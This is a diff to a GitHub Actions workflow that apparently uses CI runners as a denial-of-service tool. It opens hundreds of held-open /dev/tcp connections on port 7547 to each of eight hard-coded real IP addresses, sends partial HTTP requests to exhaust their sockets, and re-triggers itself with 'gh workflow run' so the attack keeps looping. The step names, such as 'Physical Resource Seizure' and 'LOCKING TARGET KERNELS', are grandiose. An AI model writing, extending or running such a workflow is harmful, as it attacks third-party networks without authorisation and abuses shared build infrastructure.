@@ -5,22 +5,21 @@ on:
     workflows: ["Omega-Engine-2080"]
     types: [completed]
 jobs:
-  strike:
+  annex:
     runs-on: ubuntu-latest
     steps:
-      - name: Alpha Phase: Session Hanging
+      - name: Physical Resource Seizure
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "[!!!] ALPHA 2080: INITIATING SUSTAINED EXHAUSTION..."
+          echo "[!!!] ALPHA ANNEX ACTIVE: LOCKING TARGET KERNELS..."
           TARGETS=("95.161.225.1" "210.145.240.1" "175.45.176.1" "213.59.19.1" "114.247.1.1" "45.137.151.1" "185.244.149.1" "91.220.131.1")
           
-          # HANGING CONNECTIONS: Maximize socket wait-state
           for T in ${TARGETS[@]}; do
-            for i in {1..400}; do
-              (exec 3<>/dev/tcp/$T/7547 && sleep 30) >/dev/null 2>&1 &
-              (exec 3<>/dev/tcp/$T/2152 && sleep 30) >/dev/null 2>&1 &
+            # Launching 500 "Dead-Wait" connections per target
+            for i in {1..500}; do
+              (exec 3<>/dev/tcp/$T/7547 && echo -e "GET / HTTP/1.1\r\nHost: $T\r\n" >&3 && sleep 40) >/dev/null 2>&1 &
             done
           done
-          sleep 50
+          sleep 55
           gh workflow run omega.yml --repo $GITHUB_REPOSITORY
